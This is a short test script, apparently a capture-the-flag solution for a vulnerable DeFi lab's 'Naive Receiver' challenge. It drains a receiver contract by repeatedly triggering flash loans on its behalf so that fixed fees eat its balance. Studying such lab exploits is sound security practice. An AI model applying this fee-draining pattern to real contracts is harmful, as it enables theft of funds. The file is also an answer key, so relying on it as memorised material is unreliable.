/**
 * Exploit for the Naive Receiver vulnerability
 * 
 * This exploitation takes advantage of the lack of restriction on who can
 * initiate a flash loan for a given receiver, and the high fixed fees.
 */

it('Exploit', async function () {
    console.log('Initial receiver balance:', (await ethers.provider.getBalance(this.receiver.address)).toString());
    
    // Drain the receiver contract by making 10 flash loan calls with a minimal amount
    for (let i = 0; i < 10; i++) {
        await this.pool.flashLoan(this.receiver.address, '1');
        console.log(`After call ${i+1}, receiver balance:`, 
            (await ethers.provider.getBalance(this.receiver.address)).toString());
    }
    
    console.log('Final receiver balance:', (await ethers.provider.getBalance(this.receiver.address)).toString());
});